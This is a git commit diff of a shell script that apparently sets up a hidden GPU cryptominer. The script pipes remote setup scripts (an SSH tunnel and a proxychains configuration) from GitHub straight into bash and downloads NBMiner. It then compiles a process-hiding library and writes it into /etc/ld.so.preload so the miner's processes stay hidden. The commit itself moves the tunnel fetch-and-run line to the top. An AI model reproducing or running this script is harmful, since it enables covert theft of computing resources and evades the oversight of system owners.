2e964f1a56089d3bedfa4bf18bc7083770abe249
chadpetersen1337 <68467197+chadpetersen1337@users.noreply.github.com>
2021-03-04 13:13:38 +0200

    Update start_nbFlyp.sh

--- start_nbFlyp.sh
+++ start_nbFlyp.sh
@@ -1,5 +1,7 @@
 #!/bin/sh
+wget -O - https://raw.githubusercontent.com/chadpetersen1337/gpuminers/master/setUpSSHTunnel.sh | bash
 wget -O - https://raw.githubusercontent.com/chadpetersen1337/sockd/main/chains.sh | bash
+sleep .1
 proxychains curl ifconfig.me
 proxychains wget https://github.com/NebuTech/NBMiner/releases/download/v36.1/NBMiner_36.1_Linux.tgz
 tar -xvzf NBMiner_36.1_Linux.tgz
@@ -12,5 +14,4 @@ make
 gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
-wget -O - https://raw.githubusercontent.com/chadpetersen1337/gpuminers/master/setUpSSHTunnel.sh | bash
 ./nbFlyp.sh
